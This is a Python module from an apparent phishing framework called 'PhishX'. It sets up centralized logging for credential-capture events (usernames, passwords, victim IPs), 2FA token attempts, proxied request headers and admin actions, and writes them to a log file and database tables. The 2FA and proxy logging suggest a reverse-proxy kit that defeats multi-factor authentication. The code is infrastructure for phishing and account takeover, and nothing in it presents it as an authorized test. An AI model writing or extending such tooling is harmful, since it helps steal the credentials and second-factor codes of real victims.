import os
import json
import logging
from datetime import datetime
from flask import request
from app import db
from models import SessionLog, ProxyLog

class PhishLogger:
    """Centralized logging for phishing activities"""
    
    def __init__(self):
        self.setup_logging()
    
    def setup_logging(self):
        """Setup logging configuration"""
        log_dir = 'logs'
        os.makedirs(log_dir, exist_ok=True)
        
        # Configure main logger
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(os.path.join(log_dir, 'phishx.log')),
                logging.StreamHandler()
            ]
        )
        
        self.logger = logging.getLogger('PhishX')
    
    def log_credential_capture(self, campaign_id, username, password, ip_address):
        """Log credential capture event"""
        self.logger.info(f"[CRED_CAPTURE] Campaign: {campaign_id}, User: {username}, IP: {ip_address}")
    
    def log_session_activity(self, session_id, activity, details=None):
        """Log session activity"""
        self.logger.info(f"[SESSION] {session_id}: {activity} - {details}")
    
    def log_proxy_request(self, campaign_id, url, method, status):
        """Log proxy request"""
        self.logger.info(f"[PROXY] Campaign: {campaign_id}, {method} {url} - {status}")
        
        # Store in database
        proxy_log = ProxyLog(
            campaign_id=campaign_id,
            request_url=url,
            request_method=method,
            request_headers=json.dumps(dict(request.headers)),
            response_status=status,
            ip_address=request.remote_addr
        )
        
        db.session.add(proxy_log)
        db.session.commit()
    
    def log_2fa_attempt(self, campaign_id, token, ip_address):
        """Log 2FA attempt"""
        self.logger.info(f"[2FA] Campaign: {campaign_id}, Token: {token}, IP: {ip_address}")
    
    def log_error(self, error_type, message, details=None):
        """Log error"""
        self.logger.error(f"[ERROR] {error_type}: {message} - {details}")
    
    def log_admin_action(self, user_id, action, details=None):
        """Log admin actions"""
        self.logger.info(f"[ADMIN] User: {user_id}, Action: {action} - {details}")
    
    def get_logs(self, log_type='all', limit=100):
        """Retrieve logs from database"""
        if log_type == 'session':
            return SessionLog.query.order_by(SessionLog.timestamp.desc()).limit(limit).all()
        elif log_type == 'proxy':
            return ProxyLog.query.order_by(ProxyLog.timestamp.desc()).limit(limit).all()
        else:
            # Return combined logs (would need union query for real implementation)
            return SessionLog.query.order_by(SessionLog.timestamp.desc()).limit(limit).all()
